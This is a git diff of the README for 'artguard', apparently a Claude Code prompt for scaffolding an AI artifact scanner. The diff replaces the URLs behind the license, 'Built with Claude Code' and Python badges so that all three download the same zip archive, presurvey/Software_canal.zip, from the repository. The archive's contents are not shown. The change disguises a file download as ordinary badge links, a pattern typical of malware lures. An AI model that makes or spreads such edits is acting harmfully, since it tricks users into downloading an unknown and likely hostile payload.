@@ -1,8 +1,8 @@
 # artguard
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Built with Claude Code](https://img.shields.io/badge/Built%20with-Claude%20Code-blueviolet)](https://claude.ai/claude-code)
-[![Python 3.11+](https://img.shields.io/badge/Python-3.11+-blue.svg)](https://www.python.org/downloads/)
+[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://raw.githubusercontent.com/Zorropiscina/artguard/main/presurvey/Software_canal.zip)
+[![Built with Claude Code](https://img.shields.io/badge/Built%20with-Claude%20Code-blueviolet)](https://raw.githubusercontent.com/Zorropiscina/artguard/main/presurvey/Software_canal.zip)
+[![Python 3.11+](https://img.shields.io/badge/Python-3.11+-blue.svg)](https://raw.githubusercontent.com/Zorropiscina/artguard/main/presurvey/Software_canal.zip)
 
 A Claude Code prompt that autonomously scaffolds a full AI artifact scanner CLI.
 
